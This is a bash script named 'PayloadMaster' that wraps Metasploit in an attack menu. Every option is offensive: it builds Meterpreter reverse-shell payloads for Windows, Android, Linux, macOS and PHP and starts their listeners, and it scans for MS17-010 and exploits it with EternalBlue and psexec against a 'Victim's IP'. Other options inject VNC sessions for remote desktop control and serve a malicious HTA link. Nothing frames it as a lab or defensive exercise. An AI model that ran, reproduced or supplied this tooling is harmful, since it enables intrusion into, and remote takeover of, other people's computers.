#!/bin/bash

resize -s 27 80
clear

ip=$(hostname -I | cut -d' ' -f1)

service postgresql start

while true; do
  clear

  echo "==========================="
  echo "        PayloadMaster       "
  echo "==========================="
  echo "Select an option:"
  echo "  (1) Windows --> Create Windows payload and listener"
  echo "  (2) Android --> Create Android payload and listener"
  echo "  (3) Linux --> Create Linux payload and listener"
  echo "  (4) MacOS --> Create MacOS payload and listener"
  echo "  (5) Web --> Create Web payload and listener"
  echo "  (6) Scan if a target is vulnerable to ms17_010"
  echo "  (7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)"
  echo "  (8) Enable Remote Desktop (ms17_010_eternalblue)"
  echo "  (9) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)"
  echo "  (10) Enable Remote Desktop (ms17_010_psexec)"
  echo "  (11) Exploit Windows with a link (HTA Server)"
  echo "  (q) Quit"
  read -p "Choice: " x

  case $x in
    1)
      read -p "Enter the name of the payload (without extension): " payload_name
      read -p "Enter the payload LHOST [$ip]: " lhost
      lhost=${lhost:-$ip}
      read -p "Enter the payload LPORT [4444]: " lport
      lport=${lport:-4444}
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /root/Desktop/$payload_name.exe
      msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
      ;;
    2)
      read -p "Enter the name of the payload (without extension): " payload_name
      read -p "Enter the payload LHOST [$ip]: " lhost
      lhost=${lhost:-$ip}
      read -p "Enter the payload LPORT [4444]: " lport
      lport=${lport:-4444}
      msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport > /root/Desktop/$payload_name.apk
      msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
      ;;
    3)
      read -p "Enter the name of the payload (without extension): " payload_name
      read -p "Enter the payload LHOST [$ip]: " lhost
      lhost=${lhost:-$ip}
      read -p "Enter the payload LPORT [4444]: " lport
      lport=${lport:-4444}
      msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport > /root/Desktop/$payload_name.py
      msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
      ;;
    4)
      read -p "Enter the name of the payload (without extension): " payload_name
      read -p "Enter the payload LHOST [$ip]: " lhost
      lhost=${lhost:-$ip}
      read -p "Enter the payload LPORT [4444]: " lport
      lport=${lport:-4444}
      msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f jar > /root/Desktop/$payload_name.jar
      msfconsole -q -x "use exploit/multi/handler; set payload java/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
      ;;
    5)
      read -p "Enter the name of the payload (without extension): " payload_name
      read -p "Enter the payload LHOST [$ip]: " lhost
      lhost=${lhost:-$ip}
      read -p "Enter the payload LPORT [4444]: " lport
      lport=${lport:-4444}
      msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport > /root/Desktop/$payload_name.php
      msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit;"
      ;;
    6)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $r; exploit; exit;"
      ;;
    7)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set RHOST $r; exploit;"
      ;;
    8)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
      ;;
    9)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set LHOST $ip; set RHOST $r; exploit;"
      ;;
    10)
      echo "Victim's IP:"
      read r
      msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
      ;;
    11)
      echo 'Uripath: (/)'
      read u
      msfconsole -q -x "use exploit/windows/misc/hta_server; set SRVHOST $ip; set URIPATH /$u; set payload windows/meterpreter/reverse_tcp; set LHOST $ip; exploit;"
      ;;
    q)
      echo "Quitting..."
      exit 0
      ;;
    *)
      echo "Invalid option. Please try again."
      ;;
  esac
done

